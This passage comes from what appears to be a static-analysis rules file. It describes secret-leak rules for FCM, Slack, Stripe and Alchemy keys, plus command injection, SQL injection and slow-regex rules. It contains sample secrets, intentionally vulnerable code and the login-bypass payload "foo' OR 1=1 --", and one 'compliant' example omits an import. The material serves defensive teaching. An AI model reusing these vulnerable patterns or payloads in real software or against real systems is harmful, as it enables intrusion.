Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6710": {
        "name": "Legacy Firebase Cloud Messaging API Key should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>A FCM API key leak is particularly severe if the affected key has administrative privileges: The range of topics to which an attacker can subscribe\nand send messages is much larger than with normal privileges.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Phishing and spam</h4>\n<p>An attacker can use this {secret_type} to spam users or lure them into links to a malicious domain controlled by the attacker.</p>\n<p>Spam can cause users to be exposed to the following:</p>\n<ul>\n  <li> Unsolicited, inappropriate content, such as pornographic material </li>\n  <li> Fraudulent attempts to trick users into sending information or money </li>\n  <li> Abusive or hateful statements </li>\n  <li> False advertising or fraudulent claims </li>\n</ul>\n<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor\nauthentication (MFA), and take over the user’s account on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on\nthe attacker’s intentions, as the following examples show:</p>\n<ul>\n  <li> Cryptojacking malware, whose goal is to \"mine\" cryptocurrencies on the affected computers or servers. </li>\n  <li> Spyware that spies out sensitive information from victims. </li>\n</ul>\n<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>\n<h4>Chaining of vulnerabilities</h4>\n<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If\nthe webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>\n<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point\nof failure (SPOF), this leak is critical.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"fcm_key\", \"cfUDlZL9YBQ:APA91bJxU9oMf3RbiyqnmUO60KU_JLawjf2yrTfSs3_ZAp3dxZS0J88G5P5AoKWoviAdUK5i-2SB7iHcb4Wd38EMsZXBAAb6GZMaSOeKfaI0DuLxAFTOgGNKRSmj2R9gIQyzpjoThmqe\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"fcm_key\", System.getenv(\"FCM_KEY\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6717": {
        "name": "Slack workflow webhook URLs should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Slack Workflow webhook URLs have different effects depending on their permissions: They can be used only to write Slack posts or to trigger other\nworkflows.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Phishing and spam</h4>\n<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>\n<p>Spam can cause users to be exposed to the following:</p>\n<ul>\n  <li> Unsolicited, inappropriate content, such as pornographic material </li>\n  <li> Fraudulent attempts to trick users into sending information or money </li>\n  <li> Abusive or hateful statements </li>\n  <li> False advertising or fraudulent claims </li>\n</ul>\n<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor\nauthentication (MFA), and take over the user’s account on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on\nthe attacker’s intentions, as the following examples show:</p>\n<ul>\n  <li> Cryptojacking malware, whose goal is to \"mine\" cryptocurrencies on the affected computers or servers. </li>\n  <li> Spyware that spies out sensitive information from victims. </li>\n</ul>\n<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>\n<h4>Chaining of vulnerabilities</h4>\n<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If\nthe webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>\n<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point\nof failure (SPOF), this leak is critical.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"slack_webhook_url\", \"https://hooks.slack.com/workflows/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\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"slack_webhook_url\", System.getenv(\"SLACK_WEBHOOK_URL\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6718": {
        "name": "Stripe endpoint secrets should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Stripe endpoint secrets allow webhooks to verify that requests to a user-owned webhook really originated from Stripe. This data can be used to\ntransmit thousands of different types of <a href=\"https://stripe.com/docs/api/events/types\">sensitive events</a>.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>\n<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit\ntrail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or\nfraudulent activity.</p>\n<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal\ncomplications.</p>\n<h4>Financial loss</h4>\n<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or\nthe account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or\nimpoverishment of individuals.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"stripe_endpoint_secret\", \"whsec_3cAgzYnf0seUtVzSAP08cH9nDICqwI1T\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"stripe_endpoint_secret\", System.getenv(\"STRIPE_ENDPOINT_SECRET\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "secrets:S6719": {
        "name": "Alchemy API keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>\n<h4>Disclosure of blockchain data</h4>\n<p>The leaked key can be used to query APIs of blockchain services and access sensitive information stored in the service metadata. This may include\nuser identities and other sensitive data.<br> Such disclosure compromises user privacy and confidentiality.</p>\n<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>\n<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit\ntrail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or\nfraudulent activity.</p>\n<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal\ncomplications.</p>\n<h4>Financial loss</h4>\n<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or\nthe account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or\nimpoverishment of individuals.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprops.set(\"alchemy_eth_api_key\", \"https://eth-mainnet.alchemyapi.io/v2/sAwFYc32ctGA_VSdesa72bheDxfGWRWl\") // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprops.set(\"alchemy_eth_api_key\", System.getenv(\"ALCHEMY_ETH_API_KEY\"))\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<p>Especially, in this example, if the <strong>host</strong> request parameter contains system shell control characters, the expected\n<code>ping</code> command behavior will be changed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/example')\ndef example():\n    host = request.args.get(\"host\", \"www.google.com\")\n\n    status = os.system(\"ping -c 1 %s\" % host) # Noncompliant\n    return str(status == 0)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/example')\ndef example():\n    host = request.args.get(\"host\", \"www.google.com\")\n\n    status = subprocess.run([\"ping\", \"-c\", \"1\", \"--\", host]).returncode\n    return str(status == 0)\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>subprocess</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>In the example compliant code, using the <code>subprocess.run</code> function helps to escape the passed arguments. It accepts a list of command\narguments that will be properly escaped and concatenated to form the command line to execute.</p>\n<h4>Disable shell integration</h4>\n<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>\n<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system\nshell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be\nused to break out of a command call.</p>\n<p>Therefore, it is generally preferable to disable shell integration.</p>\n<p>In the example compliant code, using the <code>subprocess</code> module’s functions is preferred over older alternative as the <code>os</code> or\n<code>popen</code> modules. Indeed, <code>subprocess</code>, while still a dangerous library, disables the system shell’s syntax interpretation by\ndefault.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://peps.python.org/pep-0324/\">PEP 324 – subprocess - New process module</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Sequelize</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nfoo' OR 1=1 --\n</pre>\n<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in\nas any user within the scoped user table.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nasync function index(req, res) {\n    const { db, User } = req.app.get('sequelize');\n\n    const user = req.query.user;\n    const pass = req.query.pass;\n\n    let loggedInUser = await db.query(\n        `SELECT * FROM users WHERE user = '${user}' AND pass = '${pass}'`,\n        {\n            model: User,\n        }\n    ); // Noncompliant\n\n    res.send(JSON.stringify(loggedInUser));\n    res.end();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nasync function index(req, res) {\n    const { db, User, QueryTypes } = req.app.get('sequelize');\n\n    const user = req.query.user;\n    const pass = req.query.pass;\n\n    let loggedInUser = await db.query(\n        `SELECT * FROM users WHERE user = $user AND pass = $pass`,\n        {\n            bind: {\n                user: user,\n                pass: pass,\n            },\n            type: QueryTypes.SELECT,\n            model: User,\n        }\n    );\n\n    res.send(JSON.stringify(loggedInUser));\n    res.end();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S5852": {
        "name": "Using slow regular expressions is security-sensitive",
        "htmlDesc": "<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating\nan input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity\nof the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger\n<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too\nwith, in this case, a large carefully-crafted input (thousands chars).</p>\n<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>\n<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can\nfail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>re.fullmatch</code>), the end of the regex\ncounts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>\n<ul>\n  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different\n  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if\n  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only\n  one way to match it). </li>\n  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional\n  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the\n  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different\n  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>.\n  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>\n  <li> If you’re performing a partial match (such as by using <code>re.search</code>, <code>re.split</code>, <code>re.findall</code> etc.) and the\n  regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the regex engine\n  will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a pattern that can\n  fail, can cause quadratic runtime on some inputs. For example <code>re.split(r\"\\s*,\", my_str)</code> will run in quadratic time on strings that\n  consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>\n</ul>\n<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>\n<ul>\n  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>\n  for instance. </li>\n  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this\n  nested quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists\n  exactly one <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code> (available since 